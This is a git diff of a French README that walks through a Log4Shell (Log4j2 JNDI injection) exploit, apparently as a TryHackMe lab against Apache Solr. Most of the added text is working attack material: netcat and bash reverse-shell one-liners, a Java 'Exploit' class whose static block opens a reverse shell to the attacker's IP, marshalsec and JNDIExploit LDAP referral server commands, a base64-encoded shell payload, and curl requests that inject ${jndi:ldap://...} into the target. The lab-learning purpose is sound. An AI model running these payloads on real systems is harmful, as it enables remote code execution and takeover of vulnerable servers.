@@ -20,7 +20,7 @@ JNDI propose donc une abstraction pour permettre l'accès à ces différents ser
 
 JNDI possède un rôle particulier dans les architectures applicatives développées en Java car elle est utilisée dans les spécifications de plusieurs API majeures : JDBC, EJB, JMS, ...
 
-![JNDI architecture](./jndiarch.jpg?raw=true)
+![JNDI architecture](doc/jndiarch.jpg?raw=true)
 
 JNDI est inclus dans le JDK, mais pas forcément toutes les implémentations de pilotes.
 
@@ -173,7 +173,7 @@ dn: uid=adrien,ou=users,dc=brochain
 
 [https://docs.oracle.com/javase/jndi/tutorial/ldap/misc/url.html](https://docs.oracle.com/javase/jndi/tutorial/ldap/misc/url.html)
 
-# log4j
+# log4j2
 
 [https://stackoverflow.com/questions/70375782/sense-behind-the-ldap-lookup-feature-in-log4j](https://stackoverflow.com/questions/70375782/sense-behind-the-ldap-lookup-feature-in-log4j)
 
@@ -181,9 +181,11 @@ Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12
 
 log :
 ```
-09:42:23.720 [main] INFO  org.example.TestLog4j2 - com.sun.jndi.ldap.LdapCtx@10d307f1
+09:42:23.720 [main] INFO  intro.TestLog4j2 - com.sun.jndi.ldap.LdapCtx@10d307f1
 ```
 POC OK : on peut appeler un LDAP avec un log
+
+![Test local](doc/TestLocal.drawio.png?raw=true)
 
 Test du correctif
 
@@ -194,37 +196,215 @@ pom.xml
 ```
 log :
 ```
-09:35:23.651 [main] INFO  org.example.TestLog4j2 - ${jndi:ldap://localhost:389/uid=adrien,ou=users,dc=brochain}
+09:35:23.651 [main] INFO  intro.TestLog4j2 - ${jndi:ldap://localhost:389/uid=adrien,ou=users,dc=brochain}
 ```
 
-nc -lnp 9999
-
-nc -e /bin/bash localhost 9999
-
-jndi:ldap://10.9.1.233:1389/Basic/Command/Base64/bmMgLWUgL2Jpbi9iYXNoIDEwLjkuMS4yMzMgOTk5OQ%3D%3D
-
-# suite
+# suite, en LOCAL
 
 Jusque-là on a appelé un OpenLDAP local, avec un main Java.
 Java > log4j2 > JNDI > LDAP local
 
-## exécuter du code ?
+Exécuter du code ?
 
 Au début du fichier, si l'on utilise OpenLDAP avec JNDI pour stocker des objets Java, il faut ajouter le schéma Java.
 slapd.conf
 
-slapd -V
+## OpenLDAP java schema
 ```
 ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/ldap/schema/java.ldif
 ```
 
-1. attaquant.v1.JNDIBind
-2. attaquant.v1.JNDILookup
-3. attaquant.v2.Exploit
-4. attaquant.v2.JNDIBind
-5. attaquant.v2.JNDILookup
-6. attaquant.v2.Log4j2Lookup
+## netcat
 
-## marshalsec
+[https://nc110.sourceforge.io/](https://nc110.sourceforge.io/)
+
+![OSI TCP IP](doc/osi-tcpip.png?raw=true)
+
+Objectif de l'exploit : ouvrir sur notre machine le port TCP 9999
+
+![netcat](doc/netcat.drawio.png?raw=true)
+
+```
+nc -lp 9999
+```
+Etablir une connexion depuis la machine vulnérable, vers notre machine
+```
+nc <<attacker IP>> 9999 -e /bin/bash
+```
+"In the simplest usage, "nc host port" creates a TCP connection to the given
+port on the given target host.  Your standard input is then sent to the host,
+and anything that comes back across the connection is sent to your standard
+output.  This continues indefinitely, until the network side of the connection
+shuts down"
+
+"-e filename             program to exec after connect [dangerous!!]"
+
+"this option can redirect the input, output, and error messages of an executable to a TCP/UDP port 
+rather than the default console."
+
+[https://michalwojcik.com.pl/2020/10/08/netcat-2-bind-reverse-shell/](https://michalwojcik.com.pl/2020/10/08/netcat-2-bind-reverse-shell/)
+
+"Once the connection is established, target’s Netcat will redirect /bin/bash output/input/error streams 
+to attacker’s connected machine on port 9999. Thus, attacker will be able to execute commands on target’s computer."
+
+## Sans netcat
+
+Souvent, la version de netcat est installée sans l'option -e
+
+On peut alors ouvrir un reverse shell en bash.
+```
+bash -i >& /dev/tcp/<<attacker ip>>/9999 0>&1
+```
+(sur kali le shell est zsh...)
+
+## Exploit en local
+
+![Test local 2](doc/TestLocal2.drawio.png?raw=true)
+
+Si besoin `ldapdelete  -x -W -D "cn=admin,dc=brochain" 'cn=malicious-exploit,dc=brochain'` puis `exploit.v2.JNDIBind`
+
+1. exploit.v1.JNDIBind
+2. exploit.v1.JNDILookup
+3. exploit.v2.Exploit
+4. exploit.v2.JNDIBind
+5. exploit.v2.JNDILookup
+6. `nc -lnp 9999` puis exploit.v2.Log4j2Lookup
+
+# attaque d'une machine vulnérable sur tryhackme
+
+Lancer la machine et naviguer dans l'IHM Apache Solr
+
+## Echec !
+
+en local
+```
+nc -lnvp 9999
+```
+
+en local, pour connaître mon IP sur le réseau de tryhackme
+```
+ifconfig
+```
+ou
+```
+ip addr show
+```
+
+on requête l'application Apache Solr vulnerable sur la machine cible
+```
+curl 'http://10.10.106.228:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.236:389/cn=malicious-exploit,dc=brochain\}'
+```
+
+Problème (en fait) dans les logs de l'application cible :
+```
+INFO  (qtp1008315045-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={foo=${jndi:ldap://10.9.2.236:389/cn%3Dmalicious-exploit,dc%3Dbrochain}} status=0 QTime=0
+```
+On arrive pas à produire le log qu'on veut côté Solr. Les = sont url décodés
+
+## Succès avec marshalsec
 
 [https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)
+
+Plan :
+
+![avec marshalsec v1](doc/thm_solar.drawio.svg?raw=true)
+
+### Préparation : marshalsec
+
+Si besoin, recompiler le jar marshalsec
+```
+mvn clean package
+```
+
+Puis
+```
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.2.236:8000/#Exploit"
+```
+(`10.9.2.236` est mon IP)
+"With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server"
+
+### Préparation : le payload .class
+
+Dans un répertoire www, on compile la classe Exploit.java
+```
+import java.io.Serializable;
+
+public class Exploit implements Serializable {
+
+    private static long serialVersionUID = 1L;
+
+    static {
+        try {
+            Runtime.getRuntime().exec("nc 10.9.2.236 9999 -e /bin/bash");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+*Note* ici on pourrait tester avec l'autre reverse shell `bash -i >& /dev/tcp/10.9.2.236/9999 0>&1`
+
+Avec :
+```
+javac Exploit.java -source 8 -target 8
+```
+Puis on expose le répertoire (pour le .class) avec :
+```
+python3 -m http.server
+```
+
+### Préparation : le listener ncat
+
+```
+nc -lnvp 9999
+```
+
+### Exécution : appel à solr
+
+```
+curl 'http://10.10.106.228:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.236:1389/Exploit\}'
+```
+(`10.10.106.228` est l'IP de la machine cible)
+
+## Succès avec JNDIExploit
+
+[https://github.com/avergnaud/JNDIExploit](https://github.com/avergnaud/JNDIExploit)
+
+Plan :
+
+![avec JNDIExploit](doc/thm_solar_v2.drawio.svg?raw=true)
+
+### Préparation : JNDIExploit
+
+Si besoin, recompiler le jar
+```
+mvn clean package
+```
+
+Exécuter
+```
+java -jar target/JNDIExploit-1.0-SNAPSHOT.jar -i 10.9.2.236 -p 8888
+```
+(`10.9.2.236` est mon IP)
+
+### Préparation : le listener ncat
+
+Lancer :
+```
+nc -lnvp 9999
+```
+
+### Exécution : appel à solr
+
+Sur [https://www.base64encode.org/](https://www.base64encode.org/) encoder `nc 10.9.2.236 9999 -e /bin/bash`
+
+Résultat :
+```
+bmMgMTAuOS4yLjIzNiA5OTk5IC1lIC9iaW4vYmFzaA==
+```
+Puis :
+```
+curl 'http://10.10.106.228:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.2.236:1389/Basic/Command/Base64/bmMgMTAuOS4yLjIzNiA5OTk5IC1lIC9iaW4vYmFzaA==\}'
+```
+(`10.10.106.228` est l'IP de la machine cible)
